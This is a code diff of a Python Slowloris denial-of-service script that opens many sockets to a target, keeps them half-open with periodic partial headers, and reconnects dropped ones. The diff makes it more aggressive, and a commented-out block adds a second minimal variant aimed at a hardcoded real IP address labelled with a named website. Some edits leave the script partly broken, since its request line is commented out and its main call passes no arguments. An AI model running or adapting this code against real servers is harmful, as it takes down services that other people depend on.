@@ -11,18 +11,19 @@ import time
 
 def init_socket(host, port, https=False):
 
-    ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
+    ua = "Mozilla/5.0"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(4)
+    #s.settimeout(4)
 
-    if ssl:
-        s = ssl.wrap_socket(s)
+    #if ssl:
+    #    s = ssl.wrap_socket(s)
 
     s.connect((host, port))
 
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-    s.send("User-Agent: {}\r\n".format(ua).encode())
-    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode())
+    #s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
+    #s.send("User-Agent: {}\r\n".format(ua).encode())
+    #s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
+    time.sleep(1)
 
     return s
 
@@ -38,22 +39,23 @@ def cmd_slowloris(host, count, port, https, verbose):
     list_of_sockets = []
 
     socket_count = count
-    print("Attacking %s with %s sockets.", host, socket_count)
+    print("Attacking %s with %s sockets." %(host, socket_count))
     print("Creating sockets...")
 
-    for _ in range(count):
+    for num in range(count):
         try:
-            print("Creating socket nr %s", _)
+            print("Creating socket %s" % num)
             s = init_socket(host, port, https)
+            list_of_sockets.append(s)
         except socket.error:
+            print("SOCKET ERROROOOROROR")
             break
-        list_of_sockets.append(s)
 
     while True:
-        print("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
-        for s in list(list_of_sockets):
+        print("Sending keep-alive headers... Socket count: %s" %(len(list_of_sockets)))
+        for s in list_of_sockets:
             try:
-                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+                s.send("X-SLOW: 5\r\n".encode("utf-8"))
             except socket.error:
                 list_of_sockets.remove(s)
 
@@ -64,11 +66,38 @@ def cmd_slowloris(host, count, port, https, verbose):
                 if s:
                     list_of_sockets.append(s)
             except socket.error:
+                print("SOCKET ERROROOOROROR")
                 break
 
-        time.sleep(15)
+        time.sleep(1)
 
 
 if __name__ == '__main__':
     cmd_slowloris()
+
+'''
+import socket
+from time import sleep
+
+count = 50
+
+socks = {}
+
+for n in range(count):
+    socks[n] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socks[n].connect(("45.77.113.133", 80)) # www.portantier.com
+    socks[n].send("GET / HTTP/1.0\r\n".encode())
+    socks[n].setblocking(False)
+
+
+while True:
+    for n in socks.keys():
+        socks[n].send("X-SLOW: {}\n\n".format(n, n).encode())
+        if socks[n].recv(1024):
+            del socks[n]
+        sleep(2)
+
+#for num in range(count):
+#    socklist[num].send("X-LAST: 1\r\n\r\n".encode())
+'''
 
